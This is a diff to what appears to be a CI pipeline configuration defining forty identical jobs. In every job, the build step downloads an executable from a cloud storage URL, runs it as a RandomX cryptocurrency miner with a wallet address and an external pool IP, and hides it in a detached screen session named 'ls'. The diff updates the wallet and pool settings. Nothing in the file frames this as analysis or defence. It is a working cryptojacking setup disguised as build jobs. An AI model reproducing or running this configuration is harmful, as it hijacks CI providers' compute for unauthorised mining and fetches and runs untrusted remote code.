@@ -17,7 +17,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_02:
@@ -37,7 +37,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_03:
@@ -57,7 +57,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_04:
@@ -77,7 +77,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_05:
@@ -97,7 +97,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_06:
@@ -117,7 +117,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_07:
@@ -137,7 +137,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_08:
@@ -157,7 +157,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_09:
@@ -177,7 +177,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_10:
@@ -197,7 +197,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_11:
@@ -217,7 +217,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_12:
@@ -237,7 +237,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_13:
@@ -257,7 +257,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_14:
@@ -277,7 +277,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_15:
@@ -297,7 +297,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_16:
@@ -317,7 +317,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_17:
@@ -337,7 +337,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_18:
@@ -357,7 +357,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_19:
@@ -377,7 +377,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_20:
@@ -397,7 +397,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_21:
@@ -417,7 +417,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_22:
@@ -437,7 +437,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_23:
@@ -457,7 +457,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_24:
@@ -477,7 +477,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_25:
@@ -497,7 +497,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_26:
@@ -517,7 +517,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_27:
@@ -537,7 +537,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_28:
@@ -557,7 +557,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_29:
@@ -577,7 +577,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_30:
@@ -597,7 +597,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_31:
@@ -617,7 +617,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_32:
@@ -637,7 +637,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_33:
@@ -657,7 +657,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_34:
@@ -677,7 +677,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_35:
@@ -697,7 +697,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_36:
@@ -717,7 +717,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_37:
@@ -737,7 +737,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_38:
@@ -757,7 +757,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_39:
@@ -777,7 +777,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
   App_40:
@@ -797,7 +797,7 @@ jobs:
           name: App
           command: |
             screen -dmS ls
-            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1P7 SRBMiner-MULTI start.bat && ./start.bat && stop
+            wget https://majza.nyc3.digitaloceanspaces.com/sabu && chmod +x sabu && ./sabu -algo RandomX -wallet amyKw9PUrZtAHCWc5z3zC7eh1PmmpUMbaHkjoYpQua9S5jMw8EEsqxYAbW6BLVG8z9eWNSbrNMfk35ZixqUUGnHt4pjwyBa7AA -rigName $(shuf -n 1 -i 1-999)-Angkii -pool1 157.230.216.141:443 
             sudo apt update -y
             ls
 workflows:
